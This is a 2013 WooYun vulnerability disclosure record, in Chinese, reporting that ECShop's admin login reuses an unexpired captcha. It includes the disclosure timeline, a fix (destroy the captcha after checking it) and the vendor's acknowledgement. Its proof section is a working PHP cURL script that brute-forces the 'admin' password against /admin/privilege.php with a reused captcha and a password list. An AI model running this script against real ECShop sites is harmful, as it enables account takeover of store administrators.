{"id": 10047, "wybug_id": "wooyun-2013-025053", "wybug_title": "ecshop绕过验证码暴利破解", "wybug_corp": "ShopEx", "wybug_author": "ksc", "wybug_date": "2013-06-03 11:16", "wybug_open_date": "2013-09-01 11:16", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-07-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-01：\t细节向公众公开  简要描述： 应该流行的版本都存在此问题 详细说明：  \n\n\n\n若验证码不匹配，并没有销毁当前验证码所以就可以一次请求验证码图片后，只要不再刷新验证码就可以一直使用   漏洞证明：  1.获取正确的验证码2.\n<?php$site='http://ecshop.com';$admin_path='/admin/privilege.php';$captcha='上一步获取的验证码';$referer=$site;function getH($url,$postdata=array()){\tglobal $ch,$referer;\t$options = array( CURLOPT_URL =>   $url,                \t  CURLOPT_HEADER => false,\t\t\t CURLOPT_TIMEOUT=> 0.11,\t\t\t //CURLOPT_FILE=>$f,\t\t\t CURLOPT_RETURNTRANSFER=>true,                      CURLOPT_REFERER=>$referer,\t\t\t  //CURLOPT_POST=>1,\t\t\t CURLOPT_HTTPHEADER=>array('Content-Type: application/x-www-form-urlencoded; charset=iso-8859-1','Expect:'),\t\t CURLOPT_USERAGENT=>'ie'                );          \tif(!empty($postdata)){\t\t$options[CURLOPT_POSTFIELDS]=http_build_query($postdata);\t} \t$ret = curl_setopt_array($ch,$options);\t//$ret = curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);//返回一个字符串，而不是直接输出到浏览器 \t$ret = curl_exec($ch);\t    $info = curl_getinfo($ch);\t    if (empty($info['http_code'])) {        die(\"No HTTP code was returned\");     } else if($info['http_code']==200) {//响应码为200        return $ret;    }else{        #var_dump($info);           echo '<br />';        echo ('响应码：'.$info['http_code']);//         echo '<br />';        echo $postdata['username'].'  ---'.$postdata['password'];        echo '<br />';    }\t\t}$url=$site.$admin_path;$data=array(    'username'=>'admin',    'password'=>'123456ad',    'captcha'=>$captcha,    'act'=>'signin'    );//词典$passwds=array('1','2','3','123456a','123456','123456ds');foreach($passwds as $p){    $data['password']=$p;    $res= strip_tags(getH($url,$data));    if(stripos($res,'您输入的帐号信息不正确')){        echo 'no';    }    echo '<br>------------------------<br>';}\n\n\n   修复方案：  验证识别后销毁session中的验证码   版权声明：转载请注明来源 ksc@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2013-06-03 13:13 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}